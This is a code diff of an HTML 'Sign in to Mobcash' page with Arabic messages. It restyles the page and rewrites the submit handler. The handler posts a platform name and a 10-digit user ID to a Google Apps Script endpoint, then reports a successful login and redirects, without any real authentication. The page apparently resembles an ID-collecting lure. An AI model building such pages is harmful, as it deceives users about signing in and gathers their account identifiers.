@@ -4,14 +4,21 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in to - Mobcash</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest"></script>
   <style>
+    body { font-family: 'Tajawal', sans-serif; }
     select option { color:#000; }
     @media (prefers-color-scheme: dark) { select option { color:#fff; } }
     .fade     { transition:all .3s ease; opacity:0; transform:translateY(-5px); }
     .fade.show{ opacity:1; transform:translateY(0); }
-    .icon-container { display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin-top:1rem; }
+    .icon-container {
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:1rem;
+      margin-top:1rem;
+    }
     .icon-box {
       @apply bg-white dark:bg-gray-700 border rounded-xl p-2 flex flex-col items-center justify-center cursor-pointer transition duration-200;
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
@@ -20,12 +27,26 @@
       border-color: #22c55e;
       box-shadow: 0 0 10px rgba(34,197,94,0.4);
     }
-    .icon-box img { height: 40px; object-fit: contain; }
-    .icon-name { margin-top: 0.5rem; font-size: 0.75rem; font-weight: 600; text-align: center; color: #333; }
+    .icon-box img {
+      height: 40px;
+      object-fit: contain;
+    }
+    .icon-name {
+      margin-top: 0.5rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-align: center;
+      color: #333;
+    }
+    #message {
+      min-height: 1.25rem;
+      font-weight: bold;
+      transition: all 0.3s ease;
+    }
   </style>
 </head>
 <body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
-  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
+  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-6 sm:p-8 w-full max-w-md">
     <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>
 
     <!-- زر En un clic -->
@@ -106,10 +127,10 @@
     function validateId() {
       const userId = document.getElementById("userId").value;
       const platform = platformInput.value;
-      if (!/^\d*$/.test(userId)) { showMessage("يرجى إدخال أرقام فقط."); return; }
-      if (userId.length !== 10) { showMessage("يجب أن يحتوي الـ ID على 10 أرقام."); return; }
-      if (isRepeatedDigits(userId)) { showMessage("الرقم المعرف غير صالح."); return; }
-      if (!platform) { showMessage("الرجاء اختيار المنصة."); return; }
+      if (!/^\d*$/.test(userId)) return showMessage("يرجى إدخال أرقام فقط.");
+      if (userId.length !== 10) return showMessage("يجب أن يحتوي الـ ID على 10 أرقام.");
+      if (isRepeatedDigits(userId)) return showMessage("الرقم المعرف غير صالح.");
+      if (!platform) return showMessage("الرجاء اختيار المنصة.");
       document.getElementById("message").className = "fade";
     }
 
@@ -123,6 +144,8 @@
       platformInput.value = "";
       document.getElementById("userId").value = "";
       iconBoxes.forEach(i => i.classList.remove("selected"));
+      document.getElementById("message").textContent = "";
+      document.getElementById("message").className = "fade";
     }
 
     document.getElementById("oneClickTab").addEventListener("click", resetForm);
@@ -145,13 +168,22 @@
 
       fetch("https://script.google.com/macros/s/AKfycbx5eBtV9miCzU9nk2oHtZk5hizvzE2U23aph7_g_tkf_8SiEyzxwRgRd5XRiBQ3-a35pQ/exec", {
         method: "POST",
-        mode: "no-cors",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ platform, userId })
-      }).finally(() => {
+      })
+      .then(() => {
+        showMessage("تم الدخول بنجاح!", "success");
         setTimeout(() => {
           window.location.href = "home.html";
         }, 1000);
+      })
+      .catch(() => {
+        showMessage("فشل الاتصال بالخادم", "error");
+      })
+      .finally(() => {
+        btn.disabled = false;
+        loader.classList.add("hidden");
+        label.classList.remove("hidden");
       });
     }
   </script>
